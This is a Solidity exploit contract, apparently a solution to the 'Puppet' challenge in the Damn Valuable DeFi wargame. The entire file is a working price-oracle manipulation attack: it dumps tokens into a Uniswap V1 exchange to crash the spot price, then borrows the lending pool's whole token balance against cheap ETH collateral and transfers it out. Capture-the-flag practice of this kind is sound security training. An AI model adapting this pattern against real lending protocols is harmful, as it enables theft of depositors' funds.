// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract PuppetExploit {
    PuppetPool private immutable _pool;
    DamnValuableToken private immutable _token;
    IUniswapV1Exchange private immutable _exchange;

    address private immutable _recovery;

    // constructor is marked payable to allow funding this contract with ETH upon deployment
    constructor(address token, address exchange, address pool, address recovery) payable {
        _pool = PuppetPool(pool);
        _token = DamnValuableToken(token);
        _exchange = IUniswapV1Exchange(exchange);

        _recovery = recovery;
    }

    function run() external {
        uint256 currentBalance = _token.balanceOf(address(this));
        uint256 poolTokenBalance = _token.balanceOf(address(_pool));

        // manipulate the uniswap price by dumping all tokens for ETH
        // this drops the token's price relative to ETH
        _token.approve(address(_exchange), currentBalance);
        _exchange.tokenToEthSwapInput(currentBalance, 1, block.timestamp + 2);

        // with the token price now artificially lowered, calculate the reduced collateral needed
        uint256 depositRequired = _pool.calculateDepositRequired(poolTokenBalance);

        // borrow all tokens from the pool by providing the now-cheap required ETH collateral
        _pool.borrow{value: depositRequired}(poolTokenBalance, address(this));
        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }

    receive() external payable {}
}
